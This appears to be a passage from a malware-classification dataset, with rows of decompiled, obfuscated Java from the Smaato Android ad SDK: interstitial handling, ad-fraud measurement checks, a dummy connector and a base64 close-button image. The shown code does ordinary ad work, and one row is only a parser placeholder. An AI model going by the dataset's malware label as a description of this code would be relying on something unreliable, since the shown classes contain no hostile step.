return null;               }             } .c();           }         } ).start();         return null;       }       Debugger.a(new LogMessage(this.a.e,""Interstitial Banner not ready"",1,DebugCategory.DEBUG));       return null;     }   }   public static InterstitialBannerView a() throws UnableToFindInterstitialBannerView {     try {       if (a.getParent() != null) {         ((ViewGroup)a.getParent()).removeView(a);       }       return a;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToFindInterstitialBannerView(e2);     }   }   public boolean d(){     return this.d == InterstitialStates.IS_READY;   }   @Override public void a(  AdDownloaderInterface adDownloaderInterface,  final ReceivedBannerInterface receivedBannerInterface) throws AdReceiveFailed {     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (Interstitial.b != null) {           if (receivedBannerInterface.a() == BannerStatus.SUCCESS) {             Interstitial.a.setShouldNotifyIdle(true);           }  else {             Interstitial.a.setShouldNotifyIdle(false);             Interstitial.b.e();             Interstitial.this.f();           }         }         return null;       }     } .c();   }   public void e(){     this.d=InterstitialStates.IS_READY;   }   protected void f(){     this.d=InterstitialStates.IS_NOT_READY;   }   @Override public void b(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Interstitial.a.b();         return null;       }     } .c();   }   @Override public void setLocationUpdateEnabled(  final boolean z){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Interstitial.a.setLocationUpdateEnabled(z);         return null;       }     } .c();   }   @Override public boolean c(){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         return Boolean.valueOf(Interstitial.a.c());       }     } .c().booleanValue();   }   @Override public UserSettings getUserSettings(){     return new CrashReportTemplate<UserSettings>(){       @Override public UserSettings b() throws Exception {         return Interstitial.a.getUserSettings();       }     } .c();   }   @Override public void setUserSettings(  final UserSettings userSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Interstitial.a.setUserSettings(userSettings);         return null;       }     } .c();   }   @Override public AdSettings getAdSettings(){     return new CrashReportTemplate<AdSettings>(){       @Override public AdSettings b() throws Exception {         return Interstitial.a.getAdSettings();       }     } .c();   }   @Override public void setAdSettings(  final AdSettings adSettings){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Interstitial.a.setAdSettings(adSettings);         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\InterstitialActivity.code","public class InterstitialActivity extends BaseActivity implements BannerStateListener {   private boolean a=true;   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         InterstitialActivity.this.setRequestedOrientation(1);         Interstitial.a().setBannerStateListener(InterstitialActivity.this);         Interstitial.a().setContext(InterstitialActivity.this);         try {           InterstitialActivity.this.a().addView(Interstitial.a(),new RelativeLayout.LayoutParams(-1,-1));         }  catch (        Throwable th) {           InterstitialActivity.this.a().addView(Interstitial.a(),new RelativeLayout.LayoutParams(-1,-1));         }         InterstitialActivity.this.b();         return null;       }     } .c();   }   @Override public void a(  BaseView baseView){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (Interstitial.b != null) {           Interstitial.b.c();           return null;         }         return null;       }     } .c();   }   @Override public void b(  BaseView baseView) throws ClosingLandingPageFailed {     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (Interstitial.b != null && InterstitialActivity.this.a) {           Interstitial.b.d();           InterstitialActivity.this.a=false;         }         InterstitialActivity.this.finish();         return null;       }     } .c();   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (Interstitial.b != null && InterstitialActivity.this.a) {           Interstitial.b.d();           InterstitialActivity.this.a=false;           return null;         }         return null;       }     } .c();     return super.onKeyDown(i,keyEvent);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\InterstitialAdListener.code","public interface InterstitialAdListener {   void a();   void b();   void c();   void d();   void e(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.interstitial\InterstitialBannerView.code","public class InterstitialBannerView extends BaseView {   private BannerHandler j;   private boolean k;   private Interstitial l;   public InterstitialBannerView(  Context context){     super(context);     this.k=false;   }   public void setInterstitialParent(  Interstitial interstitial){     this.l=interstitial;   }   @Override public Handler getBannerAnimatorHandler(){     if (this.j == null) {       this.j=new BannerHandler(this,this,null);     }     return this.j;   }   public void setContext(  final Activity activity){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         InterstitialBannerView.this.e.a(activity);         return null;       }     } .c();   }   @Override public void g() throws UnableToNotifyBannerIdle {     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (InterstitialBannerView.this.k) {           InterstitialBannerView.this.l.e();           Interstitial.b.a();           InterstitialBannerView.this.k=false;           return null;         }         return null;       }     } .c();     super.g();   }   public final void setShouldNotifyIdle(  boolean z){     this.k=z;   }   @Override public boolean f() throws BeaconLoadFailedException {     return super.f();   }   @Override public void onAttachedToWindow(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         InterstitialBannerView.this.f();         return null;       }     } .c();     super.onAttachedToWindow();   } public class BannerHandler extends Handler {     private WeakReference<BaseView> b;     private BaseView c;     private BannerHandler(    BaseView baseView){       this.b=null;       this.c=baseView;     }     BannerHandler(    InterstitialBannerView interstitialBannerView,    BaseView baseView,    BannerHandler bannerHandler){       this(baseView);     }     protected WeakReference<BaseView> a(){       if (this.b == null) {         this.b=new WeakReference<>(this.c);       }       return this.b;     }     @Override public void handleMessage(    final Message message){       super.handleMessage(message);       new CrashReportTemplate<Void>(){         @Override public Void b() throws Exception {           BaseView baseView=BannerHandler.this.a().get();           if (baseView != null) {             if (message.what == 101) {               baseView.getBannerState().b();               BannerAnimator.a().a(message.arg1,message.arg2,InterstitialBannerView.this.getCurrentPackage(),baseView,InterstitialBannerView.this.h);               BannerMeasurements.a().e();               InterstitialBannerView.this.a();             }  else             if (message.what == 103) {               Log.e(getClass().getCanonicalName(),""resize"");               InterstitialBannerView.this.getCurrentPackage().c().setLayoutParams(new FrameLayout.LayoutParams(message.arg1,message.arg2));               InterstitialBannerView.this.getCurrentPackage().c().requestLayout();             }  else {               baseView.getBannerState().d();             }           }           return null;         }       } .c();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.measurements\AnonymousClass1.code","public class AnonymousClass1 extends CrashReportTemplate<Void> {   private final BaseView b;   AnonymousClass1(  BaseView baseView){     this.b=baseView;   }   @Override public Void b() throws Exception {     Handler handler=new Handler();     if (!BannerMeasurements.this.d(this.b)) {       final BaseView baseView=this.b;       handler.postDelayed(new Runnable(){         @Override public void run(){           final BaseView baseView2=baseView;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (!BannerMeasurements.this.d(baseView2)) {                 Reporter.a().a(FraudesType.BANNER_OFF_SCREEN);                 return null;               }               return null;             }           } .c();         }       } ,3000L);     }     if (!BannerMeasurements.this.c(this.b)) {       final BaseView baseView2=this.b;       handler.postDelayed(new Runnable(){         @Override public void run(){           final BaseView baseView3=baseView2;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (!BannerMeasurements.this.c(baseView3)) {                 Reporter.a().a(FraudesType.BANNER_DIMENSION);                 return null;               }               return null;             }           } .c();         }       } ,3000L);     }     if (!BannerMeasurements.this.b(this.b)) {       final BaseView baseView3=this.b;       handler.postDelayed(new Runnable(){         @Override public void run(){           final BaseView baseView4=baseView3;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (!BannerMeasurements.this.b(baseView4)) {                 Reporter.a().a(FraudesType.BANNER_OVERLAP);                 return null;               }               return null;             }           } .c();         }       } ,3000L);       return null;     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.measurements\BannerMeasurements.code","public class BannerMeasurements {   private static final int DELAY=3000;   private static final int MAX_REQUEST=15;   private static final int MIN_BANNER_HEIGHT=50;   private static final int MIN_BANNER_WIDTH=320;   private static final int ONE_MINUTE=60000;   private static final int THREE_SECONDS=3000;   private static BannerMeasurements a;   private static int b=0;   private static long c=0;   private static long d=0;   private BannerMeasurements(){   }   public static final BannerMeasurements a(){     if (a == null) {       a=new BannerMeasurements();     }     return a;   }   public final boolean b() throws RequestLimiterFailed {     try {       if (c == 0) {         c=System.currentTimeMillis();       }       if (f() && b < 15) {         return true;       }       if (!f()) {         c=System.currentTimeMillis();         b=0;         return true;       }       Reporter.a().a(FraudesType.UBER_FREQUENT_REQUEST);       return false;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RequestLimiterFailed(e2);     }   }   public final void c(){     b++;   }   public final void d(){     d=System.currentTimeMillis();   }   public final void e() throws RegisterClickFailed {     try {       if (System.currentTimeMillis() - d <= 3000) {         Reporter.a().a(FraudesType.AUTO_CLICK);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RegisterClickFailed(e2);     }   }   private boolean f() throws RequestTimeFrameCalculationFailed {     try {       return System.currentTimeMillis() - c <= 60000;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new RequestTimeFrameCalculationFailed(e2);     }   } public class AnonymousClass1 extends CrashReportTemplate<Void> {     private final BaseView b;     AnonymousClass1(    BaseView baseView){       this.b=baseView;     }     @Override public Void b() throws Exception {       Handler handler=new Handler();       if (!BannerMeasurements.this.d(this.b)) {         final BaseView baseView=this.b;         handler.postDelayed(new Runnable(){           @Override public void run(){             final BaseView baseView2=baseView;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (!BannerMeasurements.this.d(baseView2)) {                   Reporter.a().a(FraudesType.BANNER_OFF_SCREEN);                   return null;                 }                 return null;               }             } .c();           }         } ,3000L);       }       if (!BannerMeasurements.this.c(this.b)) {         final BaseView baseView2=this.b;         handler.postDelayed(new Runnable(){           @Override public void run(){             final BaseView baseView3=baseView2;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (!BannerMeasurements.this.c(baseView3)) {                   Reporter.a().a(FraudesType.BANNER_DIMENSION);                   return null;                 }                 return null;               }             } .c();           }         } ,3000L);       }       if (!BannerMeasurements.this.b(this.b)) {         final BaseView baseView3=this.b;         handler.postDelayed(new Runnable(){           @Override public void run(){             final BaseView baseView4=baseView3;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (!BannerMeasurements.this.b(baseView4)) {                   Reporter.a().a(FraudesType.BANNER_OVERLAP);                   return null;                 }                 return null;               }             } .c();           }         } ,3000L);         return null;       }       return null;     }   }   public final void a(  BaseView baseView){     new AnonymousClass1(baseView).c();   }   public boolean b(  BaseView baseView) throws GettingBannerPositionFailed {     try {       ViewGroup viewGroup=(ViewGroup)baseView.getParent();       if (viewGroup == null) {         return false;       }       for (int i=0; i < viewGroup.getChildCount(); i++) {         if (viewGroup.getChildAt(i) != baseView && a(baseView,viewGroup.getChildAt(i))) {           return false;         }       }       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GettingBannerPositionFailed(e2);     }   }   private boolean a(  BaseView baseView,  View view) throws IntersectionCalculationFailed {     try {       return Rect.intersects(new Rect(baseView.getLeft(),baseView.getTop(),baseView.getRight(),baseView.getBottom()),new Rect(view.getLeft(),view.getTop(),view.getRight(),view.getBottom()));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new IntersectionCalculationFailed(e2);     }   }   public boolean c(  BaseView baseView) throws DimensionCalculationFailed {     try {       if (baseView.getWidth() < MIN_BANNER_WIDTH) {         if (baseView.getHeight() < 50) {           return false;         }       }       return true;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new DimensionCalculationFailed(e2);     }   }   public boolean d(  BaseView baseView) throws GettingViewScreenLocationFailed {     try {       return baseView.getGlobalVisibleRect(new Rect(baseView.getLeft(),baseView.getTop(),baseView.getRight(),baseView.getBottom()));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GettingViewScreenLocationFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.measurements\Reporter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@651ef2e0"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.test\DownloadTask.code","private class DownloadTask extends AsyncTask<String,Void,ReceivedBannerInterface> {   private DownloadTask(){   }   DownloadTask(  DummyConnector dummyConnector,  DownloadTask downloadTask){     this();   }   @Override public ReceivedBannerInterface doInBackground(  String... strArr){     Log.d(DummyConnector.a,""Download task created"");     try {       return DummyConnector.this.a(new URL(strArr[0]));     }  catch (    Exception e) {       Log.e(DummyConnector.a,"""");       return DummyConnector.this.e;     }   }   @Override public void onPostExecute(  ReceivedBannerInterface receivedBannerInterface){     Log.d(DummyConnector.a,""Load async finished!"");     if (DummyConnector.this.d != null) {       try {         DummyConnector.this.d.a(receivedBannerInterface);       }  catch (      UnableToNotifyAdListener e) {         Log.w(DummyConnector.a,""Unable to download Banner"");       }     }     super.onPostExecute(receivedBannerInterface);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.test\DummyConnector.code","public class DummyConnector implements HttpConnectorInterface {   public static String a=""SOMA_DummyConnector"";   private static DummyConnector f;   private List<ReceivedBanner> b=new ArrayList();   private int c=0;   private ConnectionListenerInterface d=null;   private ReceivedBanner e=null; private class DownloadTask extends AsyncTask<String,Void,ReceivedBannerInterface> {     private DownloadTask(){     }     DownloadTask(    DummyConnector dummyConnector,    DownloadTask downloadTask){       this();     }     @Override public ReceivedBannerInterface doInBackground(    String... strArr){       Log.d(DummyConnector.a,""Download task created"");       try {         return DummyConnector.this.a(new URL(strArr[0]));       }  catch (      Exception e) {         Log.e(DummyConnector.a,"""");         return DummyConnector.this.e;       }     }     @Override public void onPostExecute(    ReceivedBannerInterface receivedBannerInterface){       Log.d(DummyConnector.a,""Load async finished!"");       if (DummyConnector.this.d != null) {         try {           DummyConnector.this.d.a(receivedBannerInterface);         }  catch (        UnableToNotifyAdListener e) {           Log.w(DummyConnector.a,""Unable to download Banner"");         }       }       super.onPostExecute(receivedBannerInterface);     }   }   private DummyConnector(  String str){   }   public static DummyConnector b(){     if (f == null) {       f=new DummyConnector("""");     }     return f;   }   @Override public void a(  ConnectionListenerInterface connectionListenerInterface){     this.d=connectionListenerInterface;   }   public ReceivedBannerInterface a(  URL url) throws LoadingNewBannerFailedException {     if (this.e != null) {       Log.d(a,""Returning "" + this.e.c());     }  else {       Log.d(a,""mNextBanner not set!"");     }     return this.e;   }   public ReceivedBanner c(){     return this.e;   }   @Override public boolean b(  URL url) throws BannerHttpRequestFailed {     Log.d(a,""Create new DownloadTask"");     new DownloadTask(this,null).execute(url.toString());     return true;   }   @Override public void a() throws BeaconHttpConnectionFailed {   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.test\DummyFactory.code","public class DummyFactory extends DefaultFactory {   private DummyConnector a=DummyConnector.b(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.toaster\BannerHandler.code","public class BannerHandler extends Handler {   private WeakReference<BaseView> b;   private BaseView c;   private BannerHandler(  BaseView baseView){     this.b=null;     this.c=baseView;   }   BannerHandler(  ToasterLayout toasterLayout,  BaseView baseView,  BannerHandler bannerHandler){     this(baseView);   }   protected WeakReference<BaseView> a(){     if (this.b == null) {       this.b=new WeakReference<>(this.c);     }     return this.b;   }   @Override public void handleMessage(  final Message message){     Debugger.a(new Object(){     } );     super.handleMessage(message);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView baseView=BannerHandler.this.a().get();         if (baseView != null) {           if (message.what == 101) {             baseView.getBannerState().b();             BannerAnimator.a().a(message.arg1,message.arg2,ToasterLayout.this.getCurrentPackage(),baseView,ToasterLayout.this.h);             ToasterLayout.this.j.d();           }  else {             baseView.getBannerState().d();           }         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.toaster\CloseButtonImage.code","public class CloseButtonImage {   private static final String IMAGE_URL=""http://smaato-android-sdk.s3.amazonaws.com/x.png"";   private static String a=""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"";   private static CloseButtonImage b;   private CloseButtonImage(){   }   public static CloseButtonImage a(){     if (b == null) {       b=new CloseButtonImage();     }     return b;   }   public BitmapDrawable a(  Resources resources,  Context context) throws CloseButtonBitmapFailed {     try {       Debugger.a(new Object(){       } );       return a(resources);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new CloseButtonBitmapFailed(e2);     }   }   private BitmapDrawable a(  Resources resources) throws GeneratingBitmapFromStringFailed {     try {       Debugger.a(new Object(){       } );       byte[] decode=Base64.decode(a,0);       return new BitmapDrawable(resources,BitmapFactory.decodeByteArray(decode,0,decode.length));     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GeneratingBitmapFromStringFailed(e2);     }   }   public Bitmap b() throws GettingImageFromServerFailed {     try {       Debugger.a(new Object(){       } );       return Bitmap.createScaledBitmap(new GetBitMap().execute(IMAGE_URL).get(),40,40,true);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new GettingImageFromServerFailed(e2);     }   } class GetBitMap extends AsyncTask<String,Void,Bitmap> {     GetBitMap(){     }     @Override public Bitmap doInBackground(    final String... strArr){       return new CrashReportTemplate<Bitmap>(){         @Override public Bitmap b() throws Exception {           return BitmapFactory.decodeStream(new URL(strArr[0]).openConnection().getInputStream());         }       } .c();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.toaster\CloseButtonView.code","public class CloseButtonView extends ImageView {   public CloseButtonView(  Context context){     super(context);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         CloseButtonView.this.a();         return null;       }     } .c();   }   public void a() throws CloseButtonViewInitFailed {     try {       Debugger.a(new Object(){       } );       if (Build.VERSION.SDK_INT >= 8) {         Bitmap b=CloseButtonImage.a().b();         if (b != null) {           setImageBitmap(b);         }  else {           setBackground(CloseButtonImage.a().a(getResources(),getContext()));         }       }       int a=Converter.a().a(getContext(),50);       setLayoutParams(new RelativeLayout.LayoutParams(a,a));       ((RelativeLayout.LayoutParams)getLayoutParams()).addRule(11);     }  catch (    RuntimeException e) {       throw 